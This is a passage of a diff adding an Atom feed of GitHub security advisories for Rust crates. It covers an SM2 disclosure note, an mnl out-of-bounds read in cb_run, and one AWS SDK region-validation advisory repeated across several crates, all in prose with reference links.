+<p>This vulnerability was discovered by:</p>
+<ul>
+<li>XlabAI Team of Tencent Xuanwu Lab</li>
+<li>Atuin Automated Vulnerability Discovery Engine</li>
+</ul>
+<p>CVE and credit are preferred.</p>
+<p>If developers have any questions regarding the vulnerability details, please feel free to reach out for further discussion via email at  <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
+<h3 id="note">Note</h3>
+<p>SM2 follows the security industry standard disclosure policy—the 90+30 policy (reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, the organization reserves the right to publicly disclose all information about the issues after this timeframe.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-w3g8-fp6j-wvqw">https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-w3g8-fp6j-wvqw</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/pull/1600">https://github.com/RustCrypto/elliptic-curves/pull/1600</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/commit/4781762f23ff22ab34763410f648128055c93731">https://github.com/RustCrypto/elliptic-curves/commit/4781762f23ff22ab34763410f648128055c93731</a></li>
+<li><a href="https://github.com/RustCrypto/elliptic-curves/commit/e4f77788130d065d760e57fb109370827110a525">https://github.com/RustCrypto/elliptic-curves/commit/e4f77788130d065d760e57fb109370827110a525</a></li>
+<li><a href="https://crates.io/crates/sm2/0.14.0-pre.0">https://crates.io/crates/sm2/0.14.0-pre.0</a></li>
+<li><a href="https://crates.io/crates/sm2/0.14.0-rc.0">https://crates.io/crates/sm2/0.14.0-rc.0</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-22698">https://nvd.nist.gov/vuln/detail/CVE-2026-22698</a></li>
+<li><a href="https://github.com/advisories/GHSA-w3g8-fp6j-wvqw">https://github.com/advisories/GHSA-w3g8-fp6j-wvqw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w3g8-fp6j-wvqw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-01-09T22:27:50.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mnl] mnl has segmentation fault and invalid memory read in `mnl::cb_run`]]></title>
+        <id>https://github.com/advisories/GHSA-585q-cm62-757j</id>
+        <link href="https://github.com/advisories/GHSA-585q-cm62-757j"/>
+        <updated>2026-01-09T19:53:25.000Z</updated>
+        <content type="html"><![CDATA[<p>The function <code>mnl::cb_run</code> is marked as safe but exhibits unsound behavior when processing malformed Netlink message buffers.</p>
+<p>Passing a crafted byte slice to <code>mnl::cb_run</code> can trigger memory violations. The function does not sufficiently validate the input buffer structure before processing, leading to out-of-bounds reads.</p>
+<p>This vulnerability allows an attacker to cause a Denial of Service (segmentation fault) or potentially read unmapped memory by providing a malformed Netlink message.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mullvad/mnl-rs/issues/15">https://github.com/mullvad/mnl-rs/issues/15</a></li>
+<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0142.html">https://rustsec.org/advisories/RUSTSEC-2025-0142.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-585q-cm62-757j">https://github.com/advisories/GHSA-585q-cm62-757j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-585q-cm62-757j</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-09T19:53:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-xray] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workspacesweb] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workspacesthinclient] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workspacesinstances] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workspaces] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workmailmessageflow] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workmail] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aws-sdk-workdocs] AWS SDK for Rust v1 adopted defense in depth enhancement for region parameter value]]></title>
+        <id>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</id>
+        <link href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5"/>
+        <updated>2026-01-08T21:46:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>This notification is related to the use of specific values for the region input field when calling AWS services. An actor with access to the environment in which the SDK is used could set the region input field to an invalid value.</p>
+<p>A defense-in-depth enhancement has been implemented in the AWS SDK for Rust. This enhancement validates that a region used to construct an endpoint URL is a valid host label. The change was released on November 6, 2025. This advisory is informational to help customers understand their responsibilities regarding configuration security.</p>
+<h2 id="impact"><strong>Impact</strong></h2>
+<p>Customer applications could be configured to improperly route AWS API calls to non-existent or non-AWS hosts. While the SDK was functioning safely within the requirements of the shared responsibility model, additional safeguards have been added to support secure customer implementations.</p>
+<p><strong>Impacted versions</strong>: All versions prior to <a href="https://github.com/awslabs/aws-sdk-rust/releases/tag/release-2025-11-06">November 6, 2025 release</a></p>
+<h2 id="patches"><strong>Patches</strong></h2>
+<p>On November 6, 2025, an enhancement [1] was made to the AWS SDK for Rust release, which validates the formatting of a region, providing additional safeguards.</p>
+<h2 id="workarounds"><strong>Workarounds</strong></h2>
+<p>No workarounds are needed, but as always developers should ensure that their application is following security best practices:</p>
+<ul>
+<li>Implement proper input validation in your application code</li>
+<li>Update to the latest AWS SDK for Rust release on a regular basis</li>
+<li>Follow AWS security best practices [2] for SDK configuration</li>
+</ul>
+<h2 id="references"><strong>References</strong></h2>
+<p>Contact AWS Security via the vulnerability reporting page or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>.</p>
+<h2 id="acknowledgement"><strong>Acknowledgement</strong></h2>
+<p>AWS Security thanks Guy Arazi for bringing these customer security considerations to our attention through the coordinated disclosure process.</p>
+<p>[1] <a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a>
+[2] <a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/awslabs/aws-sdk-rust/security/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+<li><a href="https://github.com/smithy-lang/smithy-rs/pull/4383">https://github.com/smithy-lang/smithy-rs/pull/4383</a></li>
+<li><a href="https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html">https://docs.aws.amazon.com/sdk-for-rust/latest/dg/security.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-g59m-gf8j-gjf5">https://github.com/advisories/GHSA-g59m-gf8j-gjf5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g59m-gf8j-gjf5</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-01-08T21:46:19.000Z</published>
+    </entry>
+</feed>
